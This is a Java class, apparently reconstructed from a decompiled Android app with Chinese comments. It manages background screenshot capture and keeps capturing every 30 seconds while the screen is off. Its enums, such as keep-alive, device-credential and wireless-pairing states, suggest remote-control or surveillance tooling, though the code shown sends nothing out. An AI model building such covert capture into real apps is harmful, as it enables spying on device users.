package com.guard.wallet.delegate;

import android.os.Build;
import android.util.Log;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicLong;

/**
 * vendor o/r — 屏幕截图任务管理器 (ScreenCaptureManager)。
 *
 * 管理单线程执行器进行屏幕截图。
 * 检查 SDK 版本、屏幕状态，通过 AtomicLong 时间戳节流。
 *
 * ADAPT: 截屏回调已重构为 com.guard.wallet.capture.ScreenshotCallback (原 u/a.java)。
 *
 * 字段:
 *   a — 单线程截图执行器 (ExecutorService)
 *   b — 截图任务 (com.guard.wallet.thread.ScreenshotCallable)
 *   c — 上次截图时间戳（黑屏节流 30s）
 */
public final class ScreenCaptureManager {

    /** vendor f693a — 单线程截图执行器 */
    public final ExecutorService a = Executors.newSingleThreadExecutor();

    /** vendor b — 截图任务 (com.guard.wallet.thread.ScreenshotCallable) */
    public final com.guard.wallet.thread.ScreenshotCallable b = new com.guard.wallet.thread.ScreenshotCallable(true);

    /** vendor c — 上次截图时间戳（黑屏节流 30s） */
    public final AtomicLong c = new AtomicLong(0L);

    /**
     * vendor a() — 提交截图任务。
     * SDK < 30: 记录 MediaProjection 路径。
     * SDK >= 30: 检查屏幕状态，节流黑屏截图（30s），
     *            检查截图任务是否已在运行，然后提交。
     */
    public final void a() {
        int sdkInt = Build.VERSION.SDK_INT;
        String logMsg;

        if (sdkInt < 30) {
            logMsg = "MiniCap use Media Projection";
        } else {
            long now = System.currentTimeMillis();

            /* 屏幕关闭时，节流截图频率为每 30 秒一次 */
            if (!com.guard.wallet.utils.DeviceUtils.isScreenOn()) {
                AtomicLong ts = this.c;
                if (now - ts.get() < 30000L) {
                    logMsg = "\u9ED1\u5C4F\u4E2D,\u7B49\u5F8530\u79D2...";
                    Log.d("o.r", logMsg);
                    return;
                }
                ts.set(now);
            }

            /* 检查截图任务是否已在运行（SDK >= 30 路径） */
            com.guard.wallet.thread.ScreenshotCallable task = this.b;
            boolean taskRunning;
            if (sdkInt >= 30) {
                /* ADAPT: o.u 类遮蔽包 u；检查 task.b 是否为 MiniCapture 且正在运行 */
                Object captureObj = task.b;
                if (captureObj != null) {
                    try {
                        java.lang.reflect.Method bMethod = captureObj.getClass().getMethod("b");
                        Object result = bMethod.invoke(captureObj);
                        taskRunning = result instanceof Boolean && !(Boolean) result;
                    } catch (Exception ex) {
                        taskRunning = false;
                    }
                } else {
                    taskRunning = false;
                }
            } else {
                task.getClass();
                taskRunning = false;
            }

            /* 若任务未运行则提交 */
            if (!taskRunning) {
                this.a.submit(task);
            }
            return;
        }

        Log.d("o.r", logMsg);
    }

    /** 内部枚举 — UseDeviceCredentialState */
    public enum c { b, c, d }

    /** 内部枚举 — KeepAliveState */
    public enum e { b, c, d }

    /** 内部枚举 — WirelessPair 引擎状态 (vendor r$f with int a field) */
    public enum f {
        b(-1), c(0), d(1), e(2), f(3), g(4), h(5), i(6), j(7), k(8), l(9), m(10);
        public final int a;
        f(int val) { this.a = val; }
        @Override public String toString() { return this.a + " " + this.name(); }
    }

    /** 内部枚举 — AutoEngine pair state (vendor r$g with int a field) */
    public enum g {
        b(0), c(1), d(2), e(3), f(4), g(5), h(6), i(7);
        public final int a;
        g(int val) { this.a = val; }
        @Override public String toString() { return this.a + " " + this.name(); }
    }
}
